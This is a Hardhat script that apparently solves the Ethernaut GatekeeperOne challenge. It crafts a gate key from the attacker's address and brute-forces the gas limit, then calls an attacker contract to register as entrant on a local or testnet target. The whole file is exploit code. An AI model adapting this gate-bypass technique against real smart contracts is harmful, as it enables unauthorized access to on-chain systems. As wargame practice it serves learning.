import { BigNumber } from "ethers";
import { ethers, network } from "hardhat";
import { GatekeeperOne, GatekeeperOneAttacker } from "../typechain-types";

async function main() {
  let gateKeeperOne: GatekeeperOne;
  const [attacker] = await ethers.getSigners();
  const chainId = network.config.chainId;
  const isLocalTest = chainId === 31337;

  const gatekeeperOneAttacker: GatekeeperOneAttacker = await ethers.getContract(
    "GatekeeperOneAttacker"
  );

  if (isLocalTest) {
    gateKeeperOne = await ethers.getContract("GatekeeperOne");
  } else {
    gateKeeperOne = await ethers.getContractAt(
      "GatekeeperOne",
      "0xaE6Eb3eea224961e64B8b5e6C3536040eE863e3D"
    );
  }

  const attackerAddress = attacker.address;

  const addr = attackerAddress.substring(
    attackerAddress.length - 4,
    attackerAddress.length
  );

  async function check() {
    const entrant = await gateKeeperOne.entrant();
    console.log(entrant);
  }

  async function findGasCost(
    gasStart: number,
    gasLimit: number,
    gasPrice: BigNumber
  ): Promise<number | undefined> {
    try {
      await gatekeeperOneAttacker.estimateGas.attack(`0x000000010000${addr}`, {
        gasLimit: gasStart,
        gasPrice: gasPrice,
      });

      return gasStart;
    } catch (e) {
      if (gasStart < gasLimit) {
        const n = gasStart + 1;
        return await findGasCost(n, gasLimit, gasPrice);
      }
    }
  }

  await check();

  const gasCost = await ethers.provider.getFeeData();

  let attackCost: number | undefined = 6987841;

  const factor = 3 * 8191;

  attackCost = await findGasCost(
    factor + 25000,
    factor + 60000,
    gasCost!.gasPrice!
  );

  const tx = await gatekeeperOneAttacker.attack(`0x000000010000${addr}`, {
    gasLimit: attackCost,
  });

  await tx.wait(isLocalTest ? 1 : 5);

  console.log("-------------------------------------------------------");
  console.log("After attack:");

  await check();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
